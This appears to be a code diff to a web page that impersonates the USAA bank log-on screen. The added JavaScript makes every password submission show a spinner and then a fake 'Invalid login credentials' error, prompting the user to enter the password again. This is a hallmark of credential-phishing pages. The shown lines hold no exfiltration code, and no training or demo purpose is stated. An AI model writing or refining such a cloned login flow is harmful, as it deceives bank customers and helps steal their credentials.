@@ -254,7 +254,7 @@
     <a href="#" class="footer-link">Accessibility at USAA</a>
   </footer>
 
- <script>
+<script>
   const nextButton = document.getElementById('next-button');
   const loginForm = document.getElementById('login-form');
 
@@ -286,11 +286,14 @@
           <label for="remember-browser" style="font-size: 14px;">Remember this browser to log on faster next time.</label>
         </div>
         <button type="button" id="login-button">Log In</button>
+        <div id="error-message" class="error-message" style="color: red; margin-top: 10px; display: none;">Error: Invalid login credentials. (Error Code: 401)</div>
       `;
 
       // Add functionality to toggle password visibility
       const togglePassword = document.getElementById('toggle-password');
       const passwordInput = document.getElementById('password');
+      const loginButton = document.getElementById('login-button');
+      const errorMessage = document.getElementById('error-message');
 
       togglePassword.addEventListener('click', (e) => {
         e.preventDefault();
@@ -301,6 +304,53 @@
           passwordInput.type = 'password';
           togglePassword.textContent = 'Show';
         }
+      });
+
+      // Handle login button click
+      loginButton.addEventListener('click', () => {
+        const password = passwordInput.value;
+
+        if (!password) {
+          alert("Please enter your password.");
+          return;
+        }
+
+        // Show spinner after clicking "Log In"
+        loginForm.innerHTML = '<div class="spinner"></div>';
+
+        setTimeout(() => {
+          // Simulate login failure and show error message
+          loginForm.innerHTML = `
+            <label for="online-id">Online ID</label>
+            <input type="text" id="online-id" value="${onlineId}" readonly>
+            <label for="password">Password</label>
+            <div style="display: flex; align-items: center;">
+              <input type="password" id="password" placeholder="Enter Password" style="flex: 1;">
+              <a href="#" id="toggle-password" style="margin-left: 10px; color: #0056b3; text-decoration: none;">Show</a>
+            </div>
+            <div style="margin-top: 10px; text-align: left;">
+              <input type="checkbox" id="remember-browser">
+              <label for="remember-browser" style="font-size: 14px;">Remember this browser to log on faster next time.</label>
+            </div>
+            <button type="button" id="login-button">Log In</button>
+            <div class="error-message" style="color: red; margin-top: 10px;">Error: Invalid login credentials. (Error Code: 401)</div>
+          `;
+
+          // Reinitialize toggle password functionality
+          const togglePassword = document.getElementById('toggle-password');
+          const passwordInput = document.getElementById('password');
+
+          togglePassword.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (passwordInput.type === 'password') {
+              passwordInput.type = 'text';
+              togglePassword.textContent = 'Hide';
+            } else {
+              passwordInput.type = 'password';
+              togglePassword.textContent = 'Show';
+            }
+          });
+        }, 2000); // Simulate a delay for server response
       });
     }, 2000); // 2-second delay for spinner
   });
